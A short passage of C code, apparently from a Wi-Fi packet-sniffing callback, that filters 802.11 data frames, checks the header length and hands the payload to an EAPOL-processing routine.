  }

  // Data frames only
  if (frame_type != 2) {
    return;
  }

  int header_len = calc_80211_header_len(fc0, fc1);
  if (header_len > len) {
    return;
  }

  process_eapol(payload, len, header_len, &pkt->rx_ctrl);
}